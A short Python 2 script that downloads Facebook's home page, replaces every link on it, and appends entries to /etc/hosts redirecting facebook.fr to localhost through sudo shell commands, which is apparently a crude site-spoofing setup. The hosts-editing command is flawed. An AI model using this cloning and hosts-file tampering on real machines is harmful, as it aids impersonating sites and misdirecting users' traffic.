import urllib
import re
import os
from bs4 import BeautifulSoup

url='https://www.facebook.com/'
url_arr = re.split('\W+', url)
file_path = "index.html"
dir_name = ""

if len(url_arr) < 3:
	print "Error"
if url_arr[1] == "www":
	host = url_arr[2]
else:
	host = url_arr[1]
dir_name = host + "/"

if not os.path.exists(dir_name):
	os.makedirs(dir_name)
file_path = dir_name + file_path
f = urllib.urlretrieve(url, file_path)
f = open(file_path, 'r+')
content = f.read()
soup = BeautifulSoup(content)
for link in soup.find_all('a'):
    new_tag = soup.new_tag("a", href="https://www.facebook.com/")
    new_tag.string = "Replaced"
    link.replace_with(new_tag);
f.seek(0)
f.truncate()
f.write(str(soup))
os.system('sudo echo "127.0.0.1 ' + host+ '.fr" >> /etc/hosts')
os.system('sudo echo "127.0.0.1 www.' + host+ '.fr" >> /etc/hosts')
